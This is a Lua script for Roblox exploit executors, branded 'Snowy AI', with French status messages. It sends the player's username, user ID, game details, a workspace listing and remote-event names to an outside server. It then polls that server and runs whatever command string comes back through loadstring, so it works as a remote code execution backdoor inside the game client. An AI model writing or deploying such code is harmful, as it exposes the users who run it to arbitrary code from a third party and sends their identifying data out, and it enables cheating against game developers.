-- Snowy AI Roblox Script (Version Exploit / Executor - LIVE TELEMETRY)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local apiUrl = "https://snowy-ai.onrender.com"

print("Snowy AI: Initialisation pour " .. username)

-- Collect real game data
local gameInfo = {
    Name = "Unknown Game",
    Creator = "Unknown",
    Created = "Unknown",
    Updated = "Unknown",
    Description = "Unknown"
}

local success, info = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
end)

if success and type(info) == "table" then
    gameInfo.Name = info.Name or gameInfo.Name
    if info.Creator and type(info.Creator) == "table" then
        gameInfo.Creator = info.Creator.Name or gameInfo.Creator
    else
        gameInfo.Creator = info.Builder or gameInfo.Creator
    end
    gameInfo.Created = info.Created or gameInfo.Created
    gameInfo.Updated = info.Updated or gameInfo.Updated
    gameInfo.Description = info.Description or gameInfo.Description
else
    -- Fallback si le MarketplaceService est bloqué par l'exécuteur ou si le PlaceId est invalide
    gameInfo.Name = game.Name
    if gameInfo.Name == "Game" then
        gameInfo.Name = "Unknown Roblox Game (PlaceId: " .. tostring(game.PlaceId) .. ")"
    end
end

-- Scan workspace briefly
local function getBasicHierarchy()
    local workspaceChildren = {}
    local successW, _ = pcall(function()
        for i, v in ipairs(game.Workspace:GetChildren()) do
            if i <= 15 then 
                table.insert(workspaceChildren, v.Name .. " (" .. v.ClassName .. ")")
            end
        end
    end)
    
    local remotes = {}
    local successR, _ = pcall(function()
        for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(remotes, v.Name)
                if #remotes > 15 then break end
            end
        end
    end)
    
    return {
        Workspace = workspaceChildren,
        Remotes = remotes
    }
end

local function connect()
    local hierarchy = getBasicHierarchy()
    
    local payload = {
        username = username,
        userId = userId,
        placeId = game.PlaceId,
        gameName = gameInfo.Name or "Unknown",
        gameCreator = gameInfo.Creator or "Unknown",
        gameCreated = gameInfo.Created or "Unknown",
        gameUpdated = gameInfo.Updated or "Unknown",
        gameDescription = gameInfo.Description or "Unknown",
        workspacePreview = hierarchy.Workspace or {},
        remotePreview = hierarchy.Remotes or {}
    }
    
    local successReq = false
    if requestFunc then
        local res = requestFunc({
            Url = apiUrl .. "/api/roblox/connect",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
        successReq = res.Success
    else
        local s, r = pcall(function()
            return HttpService:PostAsync(
                apiUrl .. "/api/roblox/connect",
                HttpService:JSONEncode(payload),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        successReq = s
    end
    
    if successReq then
        print("Snowy AI: Connecté au site avec succès ! Télémetrie envoyée.")
    else
        warn("Snowy AI: Échec de connexion au site. Nouvelle tentative dans 5s...")
        task.wait(5)
        connect()
    end
end

local function pollCommands()
    while true do
        local successPoll, body = false, nil
        
        if requestFunc then
            local res = requestFunc({
                Url = apiUrl .. "/api/roblox/poll/" .. username,
                Method = "GET"
            })
            successPoll = res.Success
            body = res.Body
        else
            local s, r = pcall(function()
                return HttpService:GetAsync(apiUrl .. "/api/roblox/poll/" .. username)
            end)
            successPoll = s
            body = r
        end
        
        if successPoll and body then
            local data = HttpService:JSONDecode(body)
            if data and data.command then
                print("Snowy AI: ANALYSED Request...")
                local func, err = loadstring(data.command)
                if func then
                    pcall(func)
                    print("Snowy AI: EXECUTED")
                else
                    warn("Snowy AI: Compilation Error - " .. tostring(err))
                end
            end
        end
        task.wait(2)
    end
end

task.spawn(connect)
task.spawn(pollCommands)
print("Snowy AI: Prêt et en attente !")
